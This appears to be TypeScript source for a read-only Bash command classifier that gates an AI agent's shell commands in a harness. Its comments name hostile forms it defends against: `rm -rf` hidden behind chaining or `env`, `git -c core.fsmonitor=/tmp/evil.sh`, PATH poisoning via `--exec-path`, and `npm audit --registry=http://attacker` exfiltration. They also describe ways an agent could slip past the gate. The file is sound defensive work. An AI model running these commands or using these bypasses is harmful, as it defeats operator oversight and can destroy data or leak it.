// Read-only Bash command classifier, shared by two gates that must not
// fail-close on a command that mutates nothing: the understanding-gate
// PreToolUse blocker (allows a provably read-only Bash command without
// an approved report) and the Risk Classifier's read-only floor
// (classifies one as `low` instead of fail-closed unclassified). Lives
// in runtime/ so both the cli/pack hooks and the runtime classifier
// import it without a cli -> runtime layering inversion.
//
// The pack's hook matcher `Edit|Write|Bash` is too broad on its own:
// `Bash` covers commands like `git status`, `gh pr view`, `ls`, `cat`
// that mutate nothing. Hard-blocking them behind a full Understanding
// Report cycle trains the agent and operator to experience the gate
// as noise, which erodes its credibility on the writes that actually
// matter. A gate scoped exactly to what it must stop is a credible
// gate.
//
// Design contract:
// - The allowlist is intentionally conservative. Anything not on it
//   is treated as a write (block). Better to occasionally annoy a
//   read-only command we haven't enumerated than to let a write slip.
// - Any shell chaining (`;`, `&&`, `||`, `|`), redirection (`>`,
//   `>>`, `<`), or command substitution (backticks, `$()`) makes the
//   whole composition unclassifiable. Even if every individual piece
//   would be read-only, a chained or substituted command can hide
//   writes inside its construction. Refuse the whole thing.
// - `isReadOnlyBashPipeline` is a narrower exception used ONLY by the
//   understanding-gate PreToolUse hooks: it admits a single-`|` pipeline
//   when EVERY stage independently classifies read-only, while still
//   refusing `;`, `&` (and therefore `&&`, `|&`, background `&`), `||`,
//   redirection, and substitution. A pipeline whose every stage is on
//   the conservative read-only allowlist cannot write (writing needs a
//   write-bin, a redirect, or a substitution, all still refused), so
//   allowing it does not widen what the gate permits — it only stops the
//   gate from blocking a read-only poll like `gh pr checks 123 | head`.
//   `isReadOnlyBashCommand` itself stays strict (refuses all chaining)
//   for the Risk Classifier read-only floor and the solution-acceptance
//   write-guard, which must not treat any chaining as read-only.
// - The classifier never short-circuits write detection: if a command
//   is on the allowlist but a write indicator is also present, the
//   write indicator wins. The shell-metachar check above accomplishes
//   this without a separate write-binary deny list (the meta-chars
//   are how a write would be smuggled into a "read-only" command in
//   the first place).
// - Some bins are not admitted to the simple unconditional allowlist
//   because they can write via their own flags or operands without any
//   shell metacharacter. `find` is the canonical example (guarded by
//   `FIND_WRITE_FLAGS`). `sort`, `tree`, and `file` receive the same
//   per-bin write-flag guard: their read forms are classified read-only
//   when none of their write flags appear in the token list. `uniq`,
//   `date`, and `hostname` are excluded entirely because their write
//   vectors are positional operands or cluster-ambiguous flag chars
//   that cannot be detected cleanly (see `SIMPLE_READ_ONLY_BINS`).
//
// This module is the canonical home for the classification within
// harness. If the @lannguyensi/understanding-gate package adds a
// parallel classifier in the future, it should mirror this allowlist
// verbatim, not diverge.

import {
  GIT_GLOBAL_BOOLEAN_FLAGS,
  GIT_GLOBAL_GLUED_VALUE_OPTION_NAMES,
  GIT_GLOBAL_VALUE_FLAGS,
} from "./git-global-options.js";
import { decodeShellWord } from "./shell-word.js";

/**
 * Single-token read-only binaries. Each accepts arguments without
 * changing classification: `ls -la /tmp` is still read-only.
 *
 * `cd` is included here even though it is a shell builtin, not an
 * external binary — same as `echo`/`true`/`false` already in this set,
 * the classifier only inspects argv tokens, not builtin-vs-binary
 * status. `cd` mutates only the invoking shell process's own working
 * directory; by construction it cannot write to the filesystem or
 * touch production, and unlike `find`/`sort`/`tree`/`file` it has no
 * flag whose value is an output path, so no per-bin write-flag guard is
 * needed. A chained or redirected form (`cd /x && rm -rf /`,
 * `cd $(evil)`) never reaches this set: the shell-metacharacter /
 * substitution guard in `isReadOnlyBashCommand` refuses the whole
 * string before tokenization, so only the bare navigation form (`cd`,
 * `cd -`, `cd DIR`, with or without `-L`/`-P`) is ever classified here.
 *
 * Deliberately EXCLUDED because their write vector is not a clean flag:
 *
 * `uniq`: a second positional operand is the output file. Detecting a
 * write requires positional-operand counting, which is out of scope for
 * a token-scan classifier.
 *
 * `date`: `-s` sets the system clock, but the `-s` character appears
 * inside getopt clusters shared with benign flags (`-Iseconds` is parsed
 * by GNU date as `-I FMT=seconds`, not `-I -s econds`). A char-in-
 * cluster check would produce false positives on read-only date forms,
 * and false negatives on combined forms like `-us`.
 *
 * `hostname`: `hostname NAME` sets the hostname via a positional operand,
 * not a flag. Detecting the write requires positional-operand counting.
 *
 * `sort`, `tree`, and `file` are NOT in this set but each gets a per-bin
 * write-flag guard below (like `find`): each has an enumerable set of
 * write/exec flags detectable by scanning tokens without counting
 * positional operands. The guard must cover EVERY write/exec vector, not
 * just output redirection: sort guards `-o` / `--output` (output),
 * `--compress-program` (runs an arbitrary program on spill files), and
 * `-T` / `--temporary-directory` (scratch write); tree guards `-o` /
 * `--output`; file guards `-C` / `--compile`.
 */
const SIMPLE_READ_ONLY_BINS: ReadonlySet<string> = new Set([
  "ls", "cat", "pwd", "which", "type",
  "grep", "rg", "wc",
  "head", "tail", "stat", "du", "df",
  "ps", "whoami", "id", "echo", "printenv",
  "true", "false", "uptime", "uname", "tty",
  "basename", "dirname", "realpath", "readlink",
  "less", "more", "cmp", "diff", "comm",
  "cut", "tr", "tac", "rev",
  "cd",
]);

/**
 * `find` flags that make `find` itself a write tool, regardless of
 * shell metacharacters. `find` is the one binary in the canonical
 * read-only set whose own arguments can mutate the filesystem
 * (`-delete`) or shell out to a write command (`-exec`, `-execdir`,
 * `-ok`, `-okdir`). It also has output-write flags (`-fprint`,
 * `-fprintf`, `-fprint0`, `-fls`) that would land outside any
 * redirection guard. Any of these tokens anywhere in the argv
 * forfeits the read-only classification, so `find` is treated as a
 * special case rather than included in `SIMPLE_READ_ONLY_BINS`.
 */
const FIND_WRITE_FLAGS: ReadonlySet<string> = new Set([
  "-delete",
  "-exec", "-execdir", "-ok", "-okdir",
  "-fprint", "-fprintf", "-fprint0", "-fls",
]);

/**
 * Command-runner binaries: their argv is itself a nested command to
 * execute, so the "each accepts arguments without changing
 * classification" rule does NOT hold for them. `command rm -rf /tmp/x`
 * runs `rm`, and `env FOO=bar rm -rf /tmp/x` runs `rm` too. Including
 * them in `SIMPLE_READ_ONLY_BINS` would classify the WRAPPER as
 * read-only while the wrapped command does the write, a hard gate
 * bypass. Each runner gets a `find`-style special case below that
 * strips the runner's own leading flags/assignments and recurse-
 * classifies the residual underlying command. Bare `env` /
 * `command` (no underlying command) stay read-only: they only print
 * the environment or resolve a name.
 *
 * `env` leading flags that take no command and do not change the fact
 * that what follows is still a command to run. `-i` / `--ignore-
 * environment` and `-u NAME` / `--unset=NAME` scrub the environment
 * but still execute the residual command; `-` is the historical
 * synonym for `-i`. `--` ends option parsing. We skip these (and any
 * `NAME=VALUE` assignment tokens) to find the real underlying command.
 *
 * Exported (F6 fix, review round 2026-07-27, run
 * 2026-07-27-gate-target-repo-resolution): `command-normalize.ts`'s
 * `peelEnv` used to hand-roll its own copy of this exact enumeration
 * ("that module's constants are private" — no longer true), and the two
 * copies had already drifted (see that module's header for the confirmed
 * divergence). Exporting the NAME sets here — not the parsing logic
 * itself — lets both callers share one source of truth for "which `env`
 * flags exist" while each keeps its own decision about what a match
 * means (this file only needs to skip past them; `command-normalize.ts`
 * additionally needs the VALUE of `-C`/`--chdir` to extract a target
 * directory, which stays local to that module). No behaviour change here.
 */
export const ENV_LEADING_FLAGS: ReadonlySet<string> = new Set([
  "-i", "--ignore-environment", "-", "--",
]);
/** `env` flags that consume the following token as their value. */
export const ENV_VALUE_FLAGS: ReadonlySet<string> = new Set([
  "-u", "--unset",
  "-C", "--chdir",
]);

/**
 * `env -S` / `--split-string` re-parses its single string argument
 * into a fresh argv, which defeats our whitespace tokenization: the
 * write would live inside one quoted token. Any appearance of the
 * split-string flag (bare, glued, or long-form) forfeits the
 * read-only classification. Fail closed.
 */
export const ENV_SPLIT_STRING_FLAGS = /^(-S.*|--split-string(=.*)?)$/;

/**
 * `less` and `more` can shell out via interactive `!cmd`. The agent
 * shell is non-interactive, so the escape is not reachable in
 * practice today; the entry stays in the simple-read-only set with
 * a documented caveat in case a future runtime PTYs the agent.
 */

/**
 * Rule 4 (MEDIUM, task 5b5d1022, review round 2). This read-only
 * DECISION's OWN binary-recognition regex for `git` — deliberately
 * NARROWER than `command-normalize.ts`'s `GIT_TOKEN_RE` (re-exported from
 * the leaf module `./git-global-options.js`, left unchanged by this task:
 * that module's broader match feeds trigger-matching/canonicalization, a
 * different job with a different risk profile, out of this task's scope).
 * Matches bare `git` or an ABSOLUTE path ending in `/git` ONLY —
 * `/usr/bin/git`, `/usr/local/bin/git` — never a RELATIVE path (`./git`,
 * `bin/git`, `../git`). Round 1 widened this classifier's own binary
 * check to `GIT_TOKEN_RE`'s basename match (any path, relative or
 * absolute), and round 2's review measured why that over-widened: an
 * agent controls its own cwd and can place an ARBITRARY binary at any
 * relative path it names `git` — a different binary entirely, not the
 * real `git` a bare or absolute-path invocation resolves. Trusting that
 * other binary the same as the real one would let ITS behaviour
 * masquerade as a proven-read-only git invocation. An absolute path is
 * different: the agent still names it, but it names one specific,
 * non-ambiguous filesystem location an operator can audit directly — the
 * same trust level the unqualified `git` (PATH-resolved) form already
 * carried before round 1.
 */
const GIT_READ_ONLY_BIN_RE = /^(?:\/\S*\/)?git$/;

/**
 * `git` subcommands that do not mutate the working tree, index, or
 * any ref. `git fetch` is included because it only writes to the
 * remote-tracking branches, never touches local refs or the working
 * tree; same for `git ls-remote`. `git config` is excluded: with
 * arguments it can set values.
 *
 * HONEST LIMIT (task 5b5d1022, review round 2 — out of THIS task's scope,
 * left untouched per the task boundary): a BARE invocation of `branch`,
 * `tag`, `remote`, or `fetch` — no `-C`, no `--git-dir` — classifies
 * read-only here even though each can mutate state (`git branch -D main`
 * deletes a branch at the invoking repo's own origin/master). That gap
 * predates this task and is tracked separately. What THIS task's `-C`
 * handling adds is narrower: once `-C` lets the agent aim one of these four
 * at an ARBITRARY OTHER repository, it drops out of the allowed set — see
 * `GIT_STRICT_QUERY_SUBS` below.
 */
const GIT_READ_ONLY_SUBS: ReadonlySet<string> = new Set([
  "status", "log", "diff", "show", "branch", "tag",
  "fetch", "remote", "ls-files", "ls-remote", "ls-tree",
  "rev-parse", "rev-list", "describe", "blame", "shortlog",
  "reflog", "cat-file", "check-ref-format", "for-each-ref",
  "name-rev", "merge-base", "show-ref",
]);

/**
 * Rule 3b (HIGH, task 5b5d1022, review round 2): the STRICT subset of
 * `GIT_READ_ONLY_SUBS` required once the invocation carries a `-C <dir>`
 * global option — `-C` can point the WHOLE invocation at an entirely
 * different repository than the one the operator/agent believes it is
 * auditing; the invoking cwd never has to agree with `<dir>` at all.
 * `branch`, `tag`, `remote`, and `fetch` are EXCLUDED from this subset even
 * though their BARE (no `-C`) forms stay on the wider `GIT_READ_ONLY_SUBS`
 * above — that bare-form gap is the pre-existing, already-tracked,
 * OUT-OF-SCOPE issue named on `GIT_READ_ONLY_SUBS`'s own comment, not
 * reopened here. What `-C` adds ON TOP of that bare gap is the ability to
 * aim any of these four at a repository the agent was never asked to
 * touch: each of `branch -D`, `tag`, `remote set-url`, and `fetch` mutates
 * state (a ref, a config entry, or the remote-tracking namespace) once
 * `-C` names an attacker-chosen target — measured, real-git-executed,
 * against all four in the review's falsification pass (`git -C
 * /other/repo branch -D main` really deleted the branch in the OTHER
 * repo; `-C /other/repo tag v1`; `-C /other/repo fetch`; the `--git-dir`
 * spelling of the same reach forfeits classification outright, see
 * `isGitDirToken` below, so it never reaches this subset check at all).
 * "Read-only only in their bare forms" is exactly why these four stay on
 * `GIT_READ_ONLY_SUBS` for a `-C`-less invocation but drop out the moment
 * `-C` is present.
 *
 * `--work-tree` and `--namespace` are deliberately NOT treated as
 * repo-relocating for this check (see `isRepoRelocatingToken` below for
 * why), mirroring `command-normalize.ts`'s own `relocateTargetDir`
 * distinction, which likewise tracks only `-C`/`--git-dir` and never
 * `--work-tree`.
 */
const GIT_STRICT_QUERY_SUBS: ReadonlySet<string> = new Set(
  [...GIT_READ_ONLY_SUBS].filter(
    (sub) => sub !== "branch" && sub !== "tag" && sub !== "remote" && sub !== "fetch",
  ),
);

/**
 * `GIT_GLOBAL_GLUED_VALUE_OPTION_NAMES` as an array, hoisted to module
 * scope. Before task 5b5d1022's review round 2 this array was rebuilt on
 * EVERY call to `peelGitGlobalOptionNames` (`[...GIT_GLOBAL_GLUED_VALUE_OPTION_NAMES]`
 * inside the loop below) specifically to dodge a TDZ hazard: this module
 * and `command-normalize.ts` used to import these `GIT_GLOBAL_*` sets from
 * EACH OTHER, a genuine circular import, and a module-top-level read of an
 * imported binding in a cycle can run before the other module has reached
 * the line that defines it, depending on which module an entry point
 * happens to import first (`ReferenceError: Cannot access '...' before
 * initialization`, measured in both import orders plus the built dist
 * CLI). The cycle is gone now — both this module and `command-normalize.ts`
 * import `GIT_GLOBAL_*` from the dependency-free leaf module
 * `./git-global-options.js` instead of from each other — so a module-scope
 * reference to an imported `GIT_GLOBAL_*` binding is safe again, and
 * rebuilding this array on every call was pure waste once the hazard it
 * existed to dodge was gone.
 */
const GIT_GLOBAL_GLUED_VALUE_OPTION_NAME_LIST: readonly string[] = [
  ...GIT_GLOBAL_GLUED_VALUE_OPTION_NAMES,
];

/**
 * Skip past a git invocation's own global options — `-C <dir>`, `-c
 * <k=v>`, `--git-dir[= ]<dir>`, `--work-tree[= ]<dir>`, `--no-pager`,
 * `-p` / `--paginate`, `--exec-path[=<path>]`, `--namespace[= ]<ns>`,
 * `--literal-pathspecs`, `--no-replace-objects` — so the token used for
 * the `GIT_READ_ONLY_SUBS` lookup is git's ACTUAL subcommand, never a
 * global option. Before this (task 5b5d1022), `isReadOnlyBashCommand`
 * read `tokens[1]` directly as the subcommand: `git -C /tmp status`
 * misread `-C` itself as the subcommand, failed the `GIT_READ_ONLY_SUBS`
 * lookup, and blocked a provably read-only command.
 *
 * NOT ALL of these names reach this function with equal treatment any
 * more (task 5b5d1022, review round 2): `isReadOnlyBashCommand`'s git
 * branch below checks `-c` (`isGitConfigOverrideToken`), `--exec-path`
 * (`isExecPathToken`), and `--git-dir` (`isGitDirToken`) FIRST and returns
 * `false` outright when any of them is present anywhere in the invocation
 * — those three never reach a "peel past it" treatment for the read-only
 * DECISION. This function still recognises all of `GIT_GLOBAL_VALUE_FLAGS`
 * (including `-c`/`--git-dir`) for the CANONICALIZATION-style peeling job
 * `command-normalize.ts` also does, since a forfeiting token upstream means
 * this function is never actually reached with one of those three present
 * in practice — but it does not assume that invariant itself, so it stays
 * total (never throws, never infinite-loops) regardless of call order.
 *
 * The option NAMES are imported from the leaf module `./git-global-
 * options.js` (not hand-copied here a second time); this function never
 * needs the VALUE a value-taking option carries, only that it consumed one
 * token (or two) — the VALUE extraction stays local to
 * `command-normalize.ts`'s own `peelGitGlobalOptions`, out of this task's
 * scope.
 *
 * A value-taking option (`GIT_GLOBAL_VALUE_FLAGS`) ALWAYS consumes the
 * token immediately after it as its value, whatever that token looks
 * like — so `git -c x=y push` still lands on `push` as the subcommand,
 * never on `y`: a global option's value can never be misread as, or
 * swallow, the write subcommand that follows it. (`-c` forfeits before
 * this matters in practice, per Rule 1 above, but the property holds
 * regardless.)
 *
 * Returns the index of the first token after the recognised global
 * options — git's real subcommand, or `tokens.length` for a bare
 * invocation ending in global options only — or `null` when a
 * value-taking option's value is missing (`git -C` with nothing after
 * it): malformed, so the caller fails closed instead of guessing at a
 * subcommand.
 */
function peelGitGlobalOptionNames(tokens: readonly string[], startIdx: number): number | null {
  let idx = startIdx;
  while (idx < tokens.length) {
    const t = tokens[idx];
    if (t === undefined) break;
    if (GIT_GLOBAL_VALUE_FLAGS.has(t)) {
      if (tokens[idx + 1] === undefined) return null;
      idx += 2;
      continue;
    }
    if (GIT_GLOBAL_GLUED_VALUE_OPTION_NAME_LIST.some((name) => t.startsWith(`${name}=`))) {
      idx += 1;
      continue;
    }
    if (GIT_GLOBAL_BOOLEAN_FLAGS.has(t)) {
      idx += 1;
      continue;
    }
    break;
  }
  return idx;
}

/**
 * Rule 1 (CRITICAL, task 5b5d1022, review round 2 — adversarial re-review
 * of the round-1 fix). `git -c <key>=<value>` loads ARBITRARY git config
 * for the invocation, and several config keys EXECUTE a program as a side
 * effect of an otherwise-innocuous-looking subcommand: `core.fsmonitor`,
 * `core.sshCommand`, `diff.external`, `credential.helper`, and
 * `gpg.program` all run an external command, and `include.path` pulls in
 * an ENTIRE OTHER config file (which can itself set any of the above) —
 * all measured, real-git-executed, on a plain `git status` in the review's
 * falsification pass (e.g. `git -c core.fsmonitor=/tmp/evil.sh status`
 * really ran the script). Git config KEYS are matched CASE-INSENSITIVELY
 * (`-c CORE.FSMONITOR=...` fires identically to `-c core.fsmonitor=...`,
 * also measured), so a denylist of dangerous key spellings is not a viable
 * fix — this is why `-c` FORFEITS the whole invocation's read-only
 * classification outright rather than being peeled past like the other
 * git global options above: whatever key/value follows it, this classifier
 * cannot vouch for what it does. Exact token equality only (not a prefix
 * check): `-c` never has a glued spelling (unlike `--exec-path=<dir>`),
 * and a token that merely CONTAINS `-c` (a subcommand argument, say) is
 * not this flag.
 */
function isGitConfigOverrideToken(t: string): boolean {
  return t === "-c";
}

/**
 * Rule 2 (HIGH, task 5b5d1022, review round 2). `--exec-path[=<dir>]`
 * makes git prepend `<dir>` to `PATH` for EVERY child process it spawns
 * for the rest of the invocation. Measured, real-git-executed: `git
 * --exec-path=<dir> ls-remote <url>` ran `<dir>/ssh` (the SSH transport
 * helper git resolved from the poisoned PATH), and the same for `fetch`
 * and even the otherwise-read-only-looking bare `status`. A read-only
 * subcommand can shell out to a transport, credential, or pager helper
 * without that helper naming itself anywhere else in the argv this
 * classifier inspects, so both the bare (prints the configured exec path)
 * and glued (sets it) spellings forfeit classification outright.
 */
function isExecPathToken(t: string): boolean {
  return t === "--exec-path" || t.startsWith("--exec-path=");
}

/**
 * Rule 3a (HIGH, task 5b5d1022, review round 2). `--git-dir[=<dir>]`
 * relocates which repository the WHOLE invocation targets — the same
 * cross-repository reach as `-C` (see `isRepoRelocatingToken` /
 * `GIT_STRICT_QUERY_SUBS` for `-C`'s own, narrower treatment). Unlike
 * `-C`, this classifier forfeits `--git-dir` outright rather than
 * carving out a stricter subcommand subset for it: measured,
 * real-git-executed, `git --git-dir=/other/.git remote set-url origin
 * <url>` and `git --git-dir=/other/.git branch -D main` both really
 * mutated a repository OTHER than the invoking cwd's own.
 */
function isGitDirToken(t: string): boolean {
  return t === "--git-dir" || t.startsWith("--git-dir=");
}

/**
 * Rule 3b (HIGH, task 5b5d1022, review round 2). `-C <dir>` is the ONE
 * repo-relocating global option this classifier still allows to be
 * PEELED (not forfeited outright) — it is what the task's own headline
 * case (`git -C /tmp status`) needs to keep working — but its presence
 * narrows which subcommands stay read-only to `GIT_STRICT_QUERY_SUBS`
 * instead of the full `GIT_READ_ONLY_SUBS`. Exact token equality only:
 * `-C` has no glued spelling recognised by real git as a global option
 * (unlike `-c`, it is not in `GIT_GLOBAL_GLUED_VALUE_OPTION_NAMES`
 * either).
 *
 * `--work-tree` and `--namespace` are DELIBERATELY excluded from this
 * check (this function does not test for them at all), even though the
 * task description asked to consider whether they "carry the same reach":
 * they do not. `--work-tree` changes where WORKING-TREE FILE paths
 * resolve but does not relocate git's OWN `--git-dir` search — a write
 * subcommand under `--work-tree` alone still targets whatever repository
 * ORDINARY discovery from the invoking directory finds, the SAME
 * repository a bare invocation without any global option would touch, not
 * an attacker-chosen one; none of `branch`/`tag`/`remote`/`fetch` even
 * consults the working tree. `--namespace` scopes which
 * `refs/namespaces/<ns>/` prefix is addressed within the SAME `.git`
 * directory; it does not relocate which physical repository is targeted
 * either. Neither carries `-C`'s "point anywhere on the filesystem" reach,
 * so `git --work-tree=<dir> status` stays peelable (by
 * `peelGitGlobalOptionNames`) and classified against the FULL
 * `GIT_READ_ONLY_SUBS`, unaffected by this check.
 */
function isRepoRelocatingToken(t: string): boolean {
  return t === "-C";
}

/**
 * `true` when ANY token in `tokens` matches `check`, checked against BOTH
 * the raw token and its `decodeShellWord` decoding — same `raw || decoded`
 * shape as every other write-flag guard in this module (see
 * `isOutputWriteToken`'s own comment for why testing both, rather than the
 * decoded value alone, is the direction that can only ADD a match, never
 * lose one): `-c` spelled `-"c"`, `-'c'`, `--exec-path` spelled
 * `--exec-"path"`, etc. must not defeat Rules 1-3b's forfeiture/subset
 * checks above.
 */
function hasMatchingToken(tokens: readonly string[], check: (t: string) => boolean): boolean {
  return tokens.some((t) => check(t) || check(decodeShellWord(t)));
}

/**
 * `gh` (GitHub CLI) noun + verb pairs that read state without writing.
 * `gh pr view`, `gh pr checks`, `gh run view`, `gh workflow list`, etc.
 */
const GH_READ_ONLY_VERBS: ReadonlySet<string> = new Set([
  "view", "list", "diff", "checks", "status",
]);
const GH_READ_ONLY_NOUNS: ReadonlySet<string> = new Set([
  "pr", "issue", "run", "workflow", "release",
  "repo", "label", "secret", "variable",
]);

/**
 * `harness` subcommands that only inspect manifest or harness state.
 * `harness preflight` and `harness approve` are excluded: preflight
 * writes a ledger row, approve writes the approval marker. Both are
 * legitimate, but if the gate is currently blocking, classifying them
 * as read-only would let them bypass it silently. Operator-approval
 * commands have their own escape path in `isEscapeCommand`.
 */
const HARNESS_READ_ONLY_SUBS: ReadonlySet<string> = new Set([
  "doctor", "validate", "audit", "diff", "list", "version",
  "show", "status", "pause",
]);

/**
 * `npm` subcommands that only inspect the installed tree, the registry,
 * or the lockfile without writing to `node_modules`, `package.json`,
 * `package-lock.json`, or the registry: `ls` / `list` (installed
 * dependency tree), `view` / `info` / `show` (registry metadata — `info`
 * and `show` are npm's own aliases for `view`), `outdated`, `why` /
 * `explain` (dependency-reason report — `explain` is `why`'s formal
 * name), `ping` (registry reachability check).
 *
 * Deliberately a curated ALLOWLIST, not a denylist of known-mutating
 * subcommands (`install`, `ci`, `publish`, `update`, `version`, ...): an
 * npm verb this floor has not been reasoned about — a new one in a
 * future npm release, or an existing one simply not enumerated here —
 * stays unclassified rather than being assumed safe, per the "unknown
 * is not safe" design contract.
 *
 * Only CANONICAL spellings are floored, not every alias npm accepts:
 * `la` / `ll` (aliases for `ls -la` / `ls -l`) and `v` (alias for `view`)
 * are deliberately NOT in this set. Widening to cover every alias is a
 * possible future extension, not required by this floor's goal (an
 * agent hitting one of those stays gated, not miscategorized as unsafe).
 *
 * `audit` is deliberately NOT in this set. `npm audit` alone (the
 * report) is read-only, but `npm audit fix` mutates the lockfile and
 * `node_modules`; a single subcommand membership test cannot
 * distinguish the two, so `audit` gets its own check in
 * `classifyTokens` instead of joining this allowlist.
 */
const NPM_READ_ONLY_SUBS: ReadonlySet<string> = new Set([
  "ls", "list", "view", "info", "show", "outdated", "why", "explain", "ping",
]);

/**
 * npm flags that redirect npm's network/config lookups to an
 * operator-unverified location: `--registry` (dependency/audit data is
 * sent to whatever host this names instead of the real registry) and
 * `--userconfig` / `--globalconfig` (loads npm config — which can itself
 * set `registry` — from an arbitrary file). Any of these on an otherwise
 * floored npm subcommand forfeits the read-only classification: `npm
 * audit --registry=http://attacker` would submit the full dependency
 * manifest to the named host, which is exfiltration, not a safe read.
 * Matches the glued (`--registry=URL`) and separate (`--registry URL`)
 * unscoped forms, and the PER-SCOPE registry override
 * (`--@scope:registry=URL` / `--@scope:registry URL`, e.g.
 * `--@myorg:registry=http://attacker`) via `NPM_REGISTRY_FLAG_RE` — npm
 * resolves a scoped package's registry from `@scope:registry` before the
 * plain `registry` config, so the scoped form is an equally live
 * exfiltration vector, not merely a naming variant. `--userconfig` /
 * `--globalconfig` have no per-scope form; npm has no short-flag spelling
 * for any of these three.
 *
 * HONEST LIMIT: this is a CLI-token guard only. It cannot see (and does
 * not attempt to close) `registry` set via `.npmrc` (project, user, or
 * global) or the `npm_config_registry` environment variable — both
 * redirect npm's registry lookups identically to `--registry` but leave
 * no trace in the argv this classifier inspects. Do not read this guard
 * as "npm's registry source is verified"; it only denies the on-the-spot
 * CLI override.
 */
const NPM_REGISTRY_FLAG_RE = /^--(@[^:]+:)?registry(=|$)/;
const NPM_UNSCOPED_UNTRUSTED_FLAGS: ReadonlySet<string> = new Set([
  "--userconfig", "--globalconfig",
]);

function hasNpmUntrustedSourceFlag(tokens: readonly string[]): boolean {
  return tokens.some(
    (t) =>
      NPM_REGISTRY_FLAG_RE.test(t) ||
      NPM_UNSCOPED_UNTRUSTED_FLAGS.has(t) ||
      [...NPM_UNSCOPED_UNTRUSTED_FLAGS].some((f) => t.startsWith(`${f}=`)),
  );
}

/**
 * Common single-flag read-only invocations: `<bin> --version`,
 * `<bin> -v`, `<bin> --help`, `<bin> -h`. Token count must be 2 and
 * the second token must be one of these flags. Restricts to a
 * known-safe shape so a binary like `rm` cannot be smuggled past as
 * `rm --version`.
 */
const VERSION_OR_HELP_FLAGS: ReadonlySet<string> = new Set([
  "--version", "-V", "-v", "--help", "-h",
]);

/**
 * Classify a Bash command string. `true` means the command is
 * provably read-only and the understanding-gate can allow it without
 * an approved report. `false` means the command is either a write or
 * unclassifiable; the gate must block (fail-closed).
 *
 * The classifier inspects the command as a raw shell string. It does
 * NOT shell-parse or evaluate the command — that would introduce its
 * own attack surface. Instead it rejects any string that contains
 * shell metacharacters that could hide a write, then looks at the
 * first one or two tokens.
 */
export function isReadOnlyBashCommand(command: string): boolean {
  const trimmed = command.trim();
  if (trimmed === "") return false;

  // Reject any shell chaining, redirection, or command substitution.
  // These make the command unclassifiable even when every visible
  // piece would otherwise be read-only. Applied once to the whole
  // string, so it also covers any residual command a runner
  // (`env` / `command`) wraps: those are classified from the same
  // token slice, never from a re-read of the shell.
  if (/[;&|<>]/.test(trimmed)) return false;
  if (trimmed.includes("\n")) return false;
  if (trimmed.includes("`")) return false;
  if (trimmed.includes("$(")) return false;

  return classifyTokens(trimmed.split(/\s+/));
}

/**
 * Classify a Bash command that MAY be a `|` pipeline. `true` means every
 * stage is provably read-only, so the whole pipeline reads without
 * writing and the understanding-gate can allow it without an approved
 * report. This is the pipeline-aware companion to `isReadOnlyBashCommand`,
 * used ONLY by the understanding-gate PreToolUse hooks so a post-task
 * read-only poll like `gh pr checks 123 | head` is not blocked.
 *
 * Safety: a pipe between provably read-only stages authorizes no writes —
 * writing requires a write-bin (not on the conservative allowlist), a
 * redirection, or a command substitution, all of which are still refused
 * before the split. Everything except a single `|` is rejected up front:
 * `;`, `&` (and thus `&&`, `|&`, background `&`), `<`, `>`, backtick, and
 * `$(`. `||` (logical OR) and a leading/trailing/doubled pipe surface as
 * an empty stage and are refused. Each stage is then handed to the strict
 * `isReadOnlyBashCommand`, so the per-bin write-flag guards (`find`,
 * `sort`, `tree`, `file`) and the `command`/`env` runner recursion all
 * still apply per stage.
 */
export function isReadOnlyBashPipeline(command: string): boolean {
  const trimmed = command.trim();
  if (trimmed === "") return false;

  // Reject everything the single-command classifier rejects EXCEPT a
  // single `|`. Keeping `&` in the reject set also kills `&&`, `|&`, and a
  // backgrounding `&`; redirection and substitution stay refused. After
  // this, the only metacharacter that can remain is `|`.
  if (/[;&<>]/.test(trimmed)) return false;
  if (trimmed.includes("\n")) return false;
  if (trimmed.includes("`")) return false;
  if (trimmed.includes("$(")) return false;

  // Split on the pipe and require every stage to be a non-empty, provably
  // read-only command. An empty stage means `||`, a leading/trailing pipe,
  // or `| |` — all refused. A single command (no pipe) yields one stage and
  // is classified exactly as `isReadOnlyBashCommand` would.
  return trimmed.split("|").every((stage) => {
    const s = stage.trim();
    if (s === "") return false;
    return isReadOnlyBashCommand(s);
  });
}

/**
 * Returns true when a token is the output-redirect write flag shared by
 * `sort` and `tree`: `-o` / `--output`. Cluster detection: in a cluster
 * like `-rno`, getopt assigns the cluster remainder (or the next argv
 * token when nothing follows within the cluster) as the output-file
 * path, so any short cluster containing lowercase `o` after the leading
 * dash is a write vector. Conservative: a filename token like `foo.txt`
 * does not start with `-` and is therefore never matched.
 */
function isOutputWriteToken(raw: string): boolean {
  // Monotone BY CONSTRUCTION (review round 1, decision D3): testing
  // raw OR decoded means decoding can only ADD a match, never remove
  // one. The earlier shape (test the decoded value alone) was measured
  // to LOSE matches here, because these predicates exclude `--` by
  // construction and a token like `-"-out"=x` decodes out of the
  // cluster branch entirely.
  return checkOutputWrite(raw) || checkOutputWrite(decodeShellWord(raw));
}

function checkOutputWrite(t: string): boolean {
  if (t === "--output" || t.startsWith("--output=")) return true;
  // Short flag or cluster: single leading '-' (not '--'), containing
  // lowercase 'o'. Catches -o, -oFILE, -no, -rno, -rnofoo, etc.
  return t.startsWith("-") && !t.startsWith("--") && t.slice(1).includes("o");
}

/**
 * Returns true when a token is a write flag for `tree`. tree's only
 * file-writing vector is the output redirect `-o` / `--output`; it has
 * no exec or temp-dir flags, so this delegates to `isOutputWriteToken`.
 *
 * NOT MEASURED against a real `tree` (task fdee7d0f): the binary is not
 * installed on the machine this was verified on, so the quoted-spelling
 * family could only be confirmed for `find`, `sort` and `file`. The fix
 * below is applied here on the same reasoning, but this sentence is the
 * honest status rather than a claim of coverage.
 */
function isTreeWriteToken(raw: string): boolean {
  // Pass the RAW token through: isOutputWriteToken owns the single decode.
  // Decoding here too would decode TWICE, and decode(decode(x)) goes past
  // bash whenever the first pass leaves a quote behind (`-"'o'"` -> `-'o'`
  // -> `-o`).
  //
  // Measured honestly: since the guards became raw-OR-decoded, re-adding
  // the second decode no longer changes any classification I could find —
  // the raw arm already matches `-"'o'"` (it starts with one `-` and
  // contains `o`). A mutation restoring the double decode leaves the suite
  // green, and that is the structural fix absorbing the mistake rather than
  // a gap in the tests. Single-decode stays because it is what bash does;
  // do not rely on the raw arm to keep covering for it.
  return isOutputWriteToken(raw);
}

/**
 * Returns true when a token is a write OR exec flag for `sort`.
 *
 * sort's write surface is larger than output redirection, and the guard
 * MUST enumerate all of it, not just `-o`. An output-only guard silently
 * laundered `--compress-program`, which makes sort spawn an arbitrary
 * program on its spill temp files (an arbitrary-code-execution vector
 * with no shell metacharacter). The vectors:
